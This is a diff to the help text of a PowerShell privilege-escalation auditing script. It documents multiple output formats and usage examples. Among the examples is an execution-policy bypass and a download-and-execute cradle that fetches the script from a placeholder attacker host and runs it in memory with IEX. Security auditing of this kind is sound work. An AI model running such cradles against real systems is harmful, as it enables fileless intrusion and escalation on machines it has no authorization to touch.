@@ -33,7 +33,7 @@ function Invoke-PrivescCheck {
     Basename (or path + basename) of the output file report.
 
     .PARAMETER Format
-    Select the format of the output file (e.g.: TXT, HTML, CSV or XML).
+    Select the format of the output file (e.g.: TXT, HTML, CSV or XML). Can be multiple separated by commas.
 
     .EXAMPLE
     PS C:\Temp\> . .\PrivescCheck.ps1; Invoke-PrivescCheck
@@ -42,7 +42,10 @@ function Invoke-PrivescCheck {
     C:\Temp\>powershell -ep bypass -c ". .\PrivescCheck.ps1; Invoke-PrivescCheck"
 
     .EXAMPLE
-    C:\Temp\>powershell "IEX (New-Object Net.WebClient).DownloadString('http://LHOST:LPORT/PrivescCheck.ps1'; Invoke-PrivescCheck"
+    C:\Temp\>powershell "IEX (New-Object Net.WebClient).DownloadString('http://LHOST:LPORT/PrivescCheck.ps1'); Invoke-PrivescCheck"
+    
+    .EXAMPLE
+    C:\Temp\>Invoke-PrivescCheck -Report PrivescCheckOutput -Format TXT,XML"
     #>
 
     [CmdletBinding()] Param(
